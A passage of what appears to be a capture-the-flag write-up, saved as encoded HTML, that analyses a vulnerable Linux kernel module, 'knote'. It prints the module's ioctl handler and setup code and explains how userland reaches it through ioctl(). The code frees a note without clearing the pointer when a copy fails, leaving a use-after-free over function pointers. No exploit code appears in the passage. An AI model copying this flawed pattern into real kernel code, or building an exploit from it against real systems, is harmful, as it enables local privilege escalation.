n><span class=3D"token punctuation">)</span> <span class=3D"token punctuati=
on">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>ENOMEM<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>

            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>data <span class=3D"token opera=
tor">=3D</span> data<span class=3D"token punctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>len <span class=3D"token operat=
or">=3D</span> ku<span class=3D"token punctuation">.</span>len<span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span><span class=3D"token function">copy_from_user</span><span=
 class=3D"token punctuation">(</span>knotes<span class=3D"token punctuation=
">[</span>ku<span class=3D"token punctuation">.</span>idx<span class=3D"tok=
en punctuation">]</span><span class=3D"token operator">-&gt;</span>data<spa=
n class=3D"token punctuation">,</span> ku<span class=3D"token punctuation">=
.</span>data<span class=3D"token punctuation">,</span> ku<span class=3D"tok=
en punctuation">.</span>len<span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">)</span> <span class=3D"token punctuation">{</s=
pan>
                <span class=3D"token function">kfree</span><span class=3D"t=
oken punctuation">(</span>knotes<span class=3D"token punctuation">[</span>k=
u<span class=3D"token punctuation">.</span>idx<span class=3D"token punctuat=
ion">]</span><span class=3D"token operator">-&gt;</span>data<span class=3D"=
token punctuation">)</span><span class=3D"token punctuation">;</span>
                <span class=3D"token function">kfree</span><span class=3D"t=
oken punctuation">(</span>knotes<span class=3D"token punctuation">[</span>k=
u<span class=3D"token punctuation">.</span>idx<span class=3D"token punctuat=
ion">]</span><span class=3D"token punctuation">)</span><span class=3D"token=
 punctuation">;</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EFAULT<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>encrypt_func <span class=3D"tok=
en operator">=3D</span> knote_encrypt<span class=3D"token punctuation">;</s=
pan>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>decrypt_func <span class=3D"tok=
en operator">=3D</span> knote_decrypt<span class=3D"token punctuation">;</s=
pan>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">case</span> KNOTE_DELETE<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span> <span class=3D"token punctuation">{</sp=
an>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            <span class=3D"token function">kfree</span><span class=3D"token=
 punctuation">(</span>knotes<span class=3D"token punctuation">[</span>ku<sp=
an class=3D"token punctuation">.</span>idx<span class=3D"token punctuation"=
>]</span><span class=3D"token operator">-&gt;</span>data<span class=3D"toke=
n punctuation">)</span><span class=3D"token punctuation">;</span>
            <span class=3D"token function">kfree</span><span class=3D"token=
 punctuation">(</span>knotes<span class=3D"token punctuation">[</span>ku<sp=
an class=3D"token punctuation">.</span>idx<span class=3D"token punctuation"=
>]</span><span class=3D"token punctuation">)</span><span class=3D"token pun=
ctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
> <span class=3D"token operator">=3D</span> <span class=3D"token constant">=
NULL</span><span class=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">case</span> KNOTE_READ<span class=3D"=
token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span> <span =
class=3D"token operator">||</span> ku<span class=3D"token punctuation">.</s=
pan>len <span class=3D"token operator">&gt;</span> knotes<span class=3D"tok=
en punctuation">[</span>ku<span class=3D"token punctuation">.</span>idx<spa=
n class=3D"token punctuation">]</span><span class=3D"token operator">-&gt;<=
/span>len<span class=3D"token punctuation">)</span> <span class=3D"token pu=
nctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span><span class=3D"token function">copy_to_user</span><span c=
lass=3D"token punctuation">(</span>ku<span class=3D"token punctuation">.</s=
pan>data<span class=3D"token punctuation">,</span> knotes<span class=3D"tok=
en punctuation">[</span>ku<span class=3D"token punctuation">.</span>idx<spa=
n class=3D"token punctuation">]</span><span class=3D"token operator">-&gt;<=
/span>data<span class=3D"token punctuation">,</span> ku<span class=3D"token=
 punctuation">.</span>len<span class=3D"token punctuation">)</span><span cl=
ass=3D"token punctuation">)</span> <span class=3D"token punctuation">{</spa=
n>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EFAULT<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">case</span> KNOTE_ENCRYPT<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span> <span class=3D"token punctuation">{</sp=
an>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span><span class=3D"token function">=
encrypt_func</span><span class=3D"token punctuation">(</span>knotes<span cl=
ass=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</sp=
an>idx<span class=3D"token punctuation">]</span><span class=3D"token operat=
or">-&gt;</span>data<span class=3D"token punctuation">,</span> knotes<span =
class=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</=
span>idx<span class=3D"token punctuation">]</span><span class=3D"token oper=
ator">-&gt;</span>len<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
         <span class=3D"token keyword">case</span> KNOTE_DECRYPT<span class=
=3D"token operator">:</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>idx <span cla=
ss=3D"token operator">&gt;=3D</span> <span class=3D"token number">10</span>=
 <span class=3D"token operator">||</span> <span class=3D"token operator">!<=
/span>knotes<span class=3D"token punctuation">[</span>ku<span class=3D"toke=
n punctuation">.</span>idx<span class=3D"token punctuation">]</span><span c=
lass=3D"token punctuation">)</span> <span class=3D"token punctuation">{</sp=
an>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span><span class=3D"token function">=
decrypt_func</span><span class=3D"token punctuation">(</span>knotes<span cl=
ass=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</sp=
an>idx<span class=3D"token punctuation">]</span><span class=3D"token operat=
or">-&gt;</span>data<span class=3D"token punctuation">,</span> knotes<span =
class=3D"token punctuation">[</span>ku<span class=3D"token punctuation">.</=
span>idx<span class=3D"token punctuation">]</span><span class=3D"token oper=
ator">-&gt;</span>len<span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">break</span><span class=3D"token =
punctuation">;</span>
        <span class=3D"token keyword">default</span><span class=3D"token op=
erator">:</span>
            <span class=3D"token function">mutex_unlock</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
note_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
            <span class=3D"token keyword">return</span> <span class=3D"toke=
n operator">-</span>EINVAL<span class=3D"token punctuation">;</span>
    <span class=3D"token punctuation">}</span>
    <span class=3D"token function">mutex_unlock</span><span class=3D"token =
punctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl=
_lock<span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">;</span>
    <span class=3D"token keyword">return</span> <span class=3D"token number=
">0</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">static</span> <span class=3D"token keyword">i=
nt</span> __init <span class=3D"token function">init_knote</span><span clas=
s=3D"token punctuation">(</span><span class=3D"token keyword">void</span><s=
pan class=3D"token punctuation">)</span> <span class=3D"token punctuation">=
{</span>
    major <span class=3D"token operator">=3D</span> <span class=3D"token fu=
nction">register_chrdev</span><span class=3D"token punctuation">(</span><sp=
an class=3D"token number">0</span><span class=3D"token punctuation">,</span=
> DEVICE_NAME<span class=3D"token punctuation">,</span> <span class=3D"toke=
n operator">&amp;</span>knote_fops<span class=3D"token punctuation">)</span=
><span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span><span class=3D"token punctuation=
">(</span>major <span class=3D"token operator">&lt;</span> <span class=3D"t=
oken number">0</span><span class=3D"token punctuation">)</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span><span class=3D"token number">1</span><span class=3D"token p=
unctuation">;</span>

    knote_class <span class=3D"token operator">=3D</span> <span class=3D"to=
ken function">class_create</span><span class=3D"token punctuation">(</span>=
THIS_MODULE<span class=3D"token punctuation">,</span> CLASS_NAME<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token function">IS_ERR</span><span class=3D"token=
 punctuation">(</span>knote_class<span class=3D"token punctuation">)</span>=
<span class=3D"token punctuation">)</span> <span class=3D"token punctuation=
">{</span>
        <span class=3D"token function">unregister_chrdev</span><span class=
=3D"token punctuation">(</span>major<span class=3D"token punctuation">,</sp=
an> DEVICE_NAME<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span><span class=3D"token number">1</span><span class=3D"token p=
unctuation">;</span>
    <span class=3D"token punctuation">}</span>

    knote_device <span class=3D"token operator">=3D</span> <span class=3D"t=
oken function">device_create</span><span class=3D"token punctuation">(</spa=
n>knote_class<span class=3D"token punctuation">,</span> <span class=3D"toke=
n number">0</span><span class=3D"token punctuation">,</span> <span class=3D=
"token function">MKDEV</span><span class=3D"token punctuation">(</span>majo=
r<span class=3D"token punctuation">,</span> <span class=3D"token number">0<=
/span><span class=3D"token punctuation">)</span><span class=3D"token punctu=
ation">,</span> <span class=3D"token number">0</span><span class=3D"token p=
unctuation">,</span> DEVICE_NAME<span class=3D"token punctuation">)</span><=
span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token function">IS_ERR</span><span class=3D"token=
 punctuation">(</span>knote_device<span class=3D"token punctuation">)</span=
><span class=3D"token punctuation">)</span>
    <span class=3D"token punctuation">{</span>
        <span class=3D"token function">class_destroy</span><span class=3D"t=
oken punctuation">(</span>knote_class<span class=3D"token punctuation">)</s=
pan><span class=3D"token punctuation">;</span>
        <span class=3D"token function">unregister_chrdev</span><span class=
=3D"token punctuation">(</span>major<span class=3D"token punctuation">,</sp=
an> DEVICE_NAME<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span><span class=3D"token number">1</span><span class=3D"token p=
unctuation">;</span>
    <span class=3D"token punctuation">}</span>

    <span class=3D"token keyword">return</span> <span class=3D"token number=
">0</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token keyword">static</span> <span class=3D"token keyword">v=
oid</span> __exit <span class=3D"token function">exit_knote</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token keyword">void</span><=
span class=3D"token punctuation">)</span>
<span class=3D"token punctuation">{</span>
    <span class=3D"token function">device_destroy</span><span class=3D"toke=
n punctuation">(</span>knote_class<span class=3D"token punctuation">,</span=
> <span class=3D"token function">MKDEV</span><span class=3D"token punctuati=
on">(</span>major<span class=3D"token punctuation">,</span> <span class=3D"=
token number">0</span><span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token function">class_unregister</span><span class=3D"to=
ken punctuation">(</span>knote_class<span class=3D"token punctuation">)</sp=
an><span class=3D"token punctuation">;</span>
    <span class=3D"token function">class_destroy</span><span class=3D"token=
 punctuation">(</span>knote_class<span class=3D"token punctuation">)</span>=
<span class=3D"token punctuation">;</span>
    <span class=3D"token function">unregister_chrdev</span><span class=3D"t=
oken punctuation">(</span>major<span class=3D"token punctuation">,</span> D=
EVICE_NAME<span class=3D"token punctuation">)</span><span class=3D"token pu=
nctuation">;</span>
<span class=3D"token punctuation">}</span>

<span class=3D"token function">module_init</span><span class=3D"token punct=
uation">(</span>init_knote<span class=3D"token punctuation">)</span><span c=
lass=3D"token punctuation">;</span>
<span class=3D"token function">module_exit</span><span class=3D"token punct=
uation">(</span>exit_knote<span class=3D"token punctuation">)</span><span c=
lass=3D"token punctuation">;</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span><span></span><span></span><span></span><span>=
</span><span></span><span></span><span></span><span></span><span></span><sp=
an></span><span></span><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span><span></span><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span><span></span><span></span><span></span><span></=
span><span></span><span></span><span></span><span></span><span></span><span=
></span><span></span><span></span><span></span><span></span><span></span><s=
pan></span><span></span><span></span><span></span><span></span><span></span=
><span></span><span></span><span></span><span></span><span></span><span></s=
pan><span></span><span></span><span></span><span></span><span></span><span>=
</span><span></span><span></span><span></span><span></span><span></span><sp=
an></span><span></span><span></span><span></span><span></span><span></span>=
<span></span><span></span><span></span><span></span><span></span><span></sp=
an><span></span><span></span><span></span><span></span><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span></span></code></pre><figcaption>Knote.c sourceode</figcaption></fi=
gure><p>The first thing that the kernel calls in a newly inserted module (c=
.q. <code>knote.ko</code>) is the function with keyword <code>__init</code>=
, which in this case belongs to the following init functions:</p><figure cl=
ass=3D"kg-card kg-code-card"><pre class=3D"line-numbers language-c" tabinde=
x=3D"0"><code class=3D"language-c"><span class=3D"token keyword">static</sp=
an> <span class=3D"token keyword">int</span> __init <span class=3D"token fu=
nction">init_knote</span><span class=3D"token punctuation">(</span><span cl=
ass=3D"token keyword">void</span><span class=3D"token punctuation">)</span>=
 <span class=3D"token punctuation">{</span>
    major <span class=3D"token operator">=3D</span> <span class=3D"token fu=
nction">register_chrdev</span><span class=3D"token punctuation">(</span><sp=
an class=3D"token number">0</span><span class=3D"token punctuation">,</span=
> DEVICE_NAME<span class=3D"token punctuation">,</span> <span class=3D"toke=
n operator">&amp;</span>knote_fops<span class=3D"token punctuation">)</span=
><span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span><span class=3D"token punctuation=
">(</span>major <span class=3D"token operator">&lt;</span> <span class=3D"t=
oken number">0</span><span class=3D"token punctuation">)</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span><span class=3D"token number">1</span><span class=3D"token p=
unctuation">;</span>

    knote_class <span class=3D"token operator">=3D</span> <span class=3D"to=
ken function">class_create</span><span class=3D"token punctuation">(</span>=
THIS_MODULE<span class=3D"token punctuation">,</span> CLASS_NAME<span class=
=3D"token punctuation">)</span><span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token function">IS_ERR</span><span class=3D"token=
 punctuation">(</span>knote_class<span class=3D"token punctuation">)</span>=
<span class=3D"token punctuation">)</span> <span class=3D"token punctuation=
">{</span>
        <span class=3D"token function">unregister_chrdev</span><span class=
=3D"token punctuation">(</span>major<span class=3D"token punctuation">,</sp=
an> DEVICE_NAME<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span><span class=3D"token number">1</span><span class=3D"token p=
unctuation">;</span>
    <span class=3D"token punctuation">}</span>

    knote_device <span class=3D"token operator">=3D</span> <span class=3D"t=
oken function">device_create</span><span class=3D"token punctuation">(</spa=
n>knote_class<span class=3D"token punctuation">,</span> <span class=3D"toke=
n number">0</span><span class=3D"token punctuation">,</span> <span class=3D=
"token function">MKDEV</span><span class=3D"token punctuation">(</span>majo=
r<span class=3D"token punctuation">,</span> <span class=3D"token number">0<=
/span><span class=3D"token punctuation">)</span><span class=3D"token punctu=
ation">,</span> <span class=3D"token number">0</span><span class=3D"token p=
unctuation">,</span> DEVICE_NAME<span class=3D"token punctuation">)</span><=
span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token function">IS_ERR</span><span class=3D"token=
 punctuation">(</span>knote_device<span class=3D"token punctuation">)</span=
><span class=3D"token punctuation">)</span>
    <span class=3D"token punctuation">{</span>
        <span class=3D"token function">class_destroy</span><span class=3D"t=
oken punctuation">(</span>knote_class<span class=3D"token punctuation">)</s=
pan><span class=3D"token punctuation">;</span>
        <span class=3D"token function">unregister_chrdev</span><span class=
=3D"token punctuation">(</span>major<span class=3D"token punctuation">,</sp=
an> DEVICE_NAME<span class=3D"token punctuation">)</span><span class=3D"tok=
en punctuation">;</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span><span class=3D"token number">1</span><span class=3D"token p=
unctuation">;</span>
    <span class=3D"token punctuation">}</span>

    <span class=3D"token keyword">return</span> <span class=3D"token number=
">0</span><span class=3D"token punctuation">;</span>
<span class=3D"token punctuation">}</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span><span></span><span></span><span></span><span></span><spa=
n></span><span></span><span></span><span></span><span></span><span></span><=
span></span><span></span><span></span><span></span><span></span><span></spa=
n><span></span><span></span></span></code></pre><figcaption>First function =
called in the kmodule</figcaption></figure><p>As we can see, it registers a=
 character device (<code>chrdev</code>) with the name "knote" and it enable=
s the device operation <code>unlocked_iotctl</code>, which means that it's =
possible to interact with the device using <code>ioctl()</code>. &nbsp;</p>=
<figure class=3D"kg-card kg-code-card"><pre class=3D"line-numbers language-=
c" tabindex=3D"0"><code class=3D"language-c"><span class=3D"token keyword">=
static</span> <span class=3D"token keyword">struct</span> <span class=3D"to=
ken class-name">file_operations</span> knote_fops <span class=3D"token oper=
ator">=3D</span> <span class=3D"token punctuation">{</span>
    <span class=3D"token punctuation">.</span>unlocked_ioctl <span class=3D=
"token operator">=3D</span> knote_ioctl
<span class=3D"token punctuation">}</span><span class=3D"token punctuation"=
>;</span>
<span aria-hidden=3D"true" class=3D"line-numbers-rows"><span></span><span><=
/span><span></span></span></code></pre><figcaption>Knote.ko file operations=
</figcaption></figure><p>This means that our only userland form of messing =
with the kmodule is using <code>ioctl()</code> to interact with the <code>k=
note_ioctl</code> function. As said, we need to use <code>int ioctl(int fd,=
 unsigned long request, ...)</code> in the exploit to pass the file, cmd an=
d arg arguments to <code>long knote_ioctl(struct file *file, unsigned int c=
md, unsigned long arg)</code> . This function performs several commands: <c=
ode>KNOTE_CREATE</code>, <code>KNOTE_DELETE</code>, <code>KNOTE_READ</code>=
, <code>KNOTE_ENCRYPT</code> and <code>KNOTE_DECRYPT</code>.</p><figure cla=
ss=3D"kg-card kg-code-card"><pre class=3D"line-numbers language-c" tabindex=
=3D"0"><code class=3D"language-c"><span class=3D"token keyword">static</spa=
n> <span class=3D"token keyword">long</span> <span class=3D"token function"=
>knote_ioctl</span><span class=3D"token punctuation">(</span><span class=3D=
"token keyword">struct</span> <span class=3D"token class-name">file</span> =
<span class=3D"token operator">*</span>file<span class=3D"token punctuation=
">,</span> <span class=3D"token keyword">unsigned</span> <span class=3D"tok=
en keyword">int</span> cmd<span class=3D"token punctuation">,</span> <span =
class=3D"token keyword">unsigned</span> <span class=3D"token keyword">long<=
/span> arg<span class=3D"token punctuation">)</span> <span class=3D"token p=
unctuation">{</span>
    <span class=3D"token function">mutex_lock</span><span class=3D"token pu=
nctuation">(</span><span class=3D"token operator">&amp;</span>knote_ioctl_l=
ock<span class=3D"token punctuation">)</span><span class=3D"token punctuati=
on">;</span>
   =20
    <span class=3D"token keyword">struct</span> <span class=3D"token class-=
name">knote_user</span> ku<span class=3D"token punctuation">;</span>
    <span class=3D"token keyword">if</span><span class=3D"token punctuation=
">(</span><span class=3D"token function">copy_from_user</span><span class=
=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span>k=
u<span class=3D"token punctuation">,</span> <span class=3D"token punctuatio=
n">(</span><span class=3D"token keyword">void</span> <span class=3D"token o=
perator">*</span><span class=3D"token punctuation">)</span>arg<span class=
=3D"token punctuation">,</span> <span class=3D"token keyword">sizeof</span>=
<span class=3D"token punctuation">(</span><span class=3D"token keyword">str=
uct</span> <span class=3D"token class-name">knote_user</span><span class=3D=
"token punctuation">)</span><span class=3D"token punctuation">)</span><span=
 class=3D"token punctuation">)</span>
        <span class=3D"token keyword">return</span> <span class=3D"token op=
erator">-</span>EFAULT<span class=3D"token punctuation">;</span>

    <span class=3D"token keyword">switch</span><span class=3D"token punctua=
tion">(</span>cmd<span class=3D"token punctuation">)</span> <span class=3D"=
token punctuation">{</span>
        <span class=3D"token keyword">case</span> KNOTE_CREATE<span class=
=3D"token operator">:</span>
            <span class=3D"token comment">// unsigned values</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>ku<span class=3D"token punctuation">.</span>len <span cla=
ss=3D"token operator">&gt;</span> <span class=3D"token number">0x20</span> =
<span class=3D"token operator">||</span> ku<span class=3D"token punctuation=
">.</span>idx <span class=3D"token operator">&gt;=3D</span> <span class=3D"=
token number">10</span><span class=3D"token punctuation">)</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EINVAL<span class=3D"token punctuation">;</span>

            <span class=3D"token comment">// create knote</span>
            <span class=3D"token keyword">char</span> <span class=3D"token =
operator">*</span>data <span class=3D"token operator">=3D</span> <span clas=
s=3D"token function">kmalloc</span><span class=3D"token punctuation">(</spa=
n>ku<span class=3D"token punctuation">.</span>len<span class=3D"token punct=
uation">,</span> GFP_KERNEL<span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
> <span class=3D"token operator">=3D</span> <span class=3D"token function">=
kmalloc</span><span class=3D"token punctuation">(</span><span class=3D"toke=
n keyword">sizeof</span><span class=3D"token punctuation">(</span><span cla=
ss=3D"token keyword">struct</span> <span class=3D"token class-name">knote</=
span><span class=3D"token punctuation">)</span><span class=3D"token punctua=
tion">,</span> GFP_KERNEL<span class=3D"token punctuation">)</span><span cl=
ass=3D"token punctuation">;</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span>data <span class=3D"token operator">=3D=3D</span> <span c=
lass=3D"token constant">NULL</span> <span class=3D"token operator">||</span=
> knotes<span class=3D"token punctuation">[</span>ku<span class=3D"token pu=
nctuation">.</span>idx<span class=3D"token punctuation">]</span> <span clas=
s=3D"token operator">=3D=3D</span> <span class=3D"token constant">NULL</spa=
n><span class=3D"token punctuation">)</span>=20
            <span class=3D"token punctuation">{</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>ENOMEM<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>

            <span class=3D"token comment">// copy userdata to note data</sp=
an>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>data <span class=3D"token opera=
tor">=3D</span> data<span class=3D"token punctuation">;</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
=3D"token punctuation">.</span>idx<span class=3D"token punctuation">]</span=
><span class=3D"token operator">-&gt;</span>len <span class=3D"token operat=
or">=3D</span> ku<span class=3D"token punctuation">.</span>len<span class=
=3D"token punctuation">;</span>
            <span class=3D"token keyword">if</span><span class=3D"token pun=
ctuation">(</span><span class=3D"token function">copy_from_user</span><span=
 class=3D"token punctuation">(</span>knotes<span class=3D"token punctuation=
">[</span>ku<span class=3D"token punctuation">.</span>idx<span class=3D"tok=
en punctuation">]</span><span class=3D"token operator">-&gt;</span>data<spa=
n class=3D"token punctuation">,</span> ku<span class=3D"token punctuation">=
.</span>data<span class=3D"token punctuation">,</span> ku<span class=3D"tok=
en punctuation">.</span>len<span class=3D"token punctuation">)</span><span =
class=3D"token punctuation">)</span> <span class=3D"token punctuation">{</s=
pan>
                <span class=3D"token function">kfree</span><span class=3D"t=
oken punctuation">(</span>knotes<span class=3D"token punctuation">[</span>k=
u<span class=3D"token punctuation">.</span>idx<span class=3D"token punctuat=
ion">]</span><span class=3D"token operator">-&gt;</span>data<span class=3D"=
token punctuation">)</span><span class=3D"token punctuation">;</span>
                <span class=3D"token function">kfree</span><span class=3D"t=
oken punctuation">(</span>knotes<span class=3D"token punctuation">[</span>k=
u<span class=3D"token punctuation">.</span>idx<span class=3D"token punctuat=
ion">]</span><span class=3D"token punctuation">)</span><span class=3D"token=
 punctuation">;</span>
                <span class=3D"token function">mutex_unlock</span><span cla=
ss=3D"token punctuation">(</span><span class=3D"token operator">&amp;</span=
>knote_ioctl_lock<span class=3D"token punctuation">)</span><span class=3D"t=
oken punctuation">;</span>
                <span class=3D"token keyword">return</span> <span class=3D"=
token operator">-</span>EFAULT<span class=3D"token punctuation">;</span>
            <span class=3D"token punctuation">}</span>
            knotes<span class=3D"token punctuation">[</span>ku<span class=
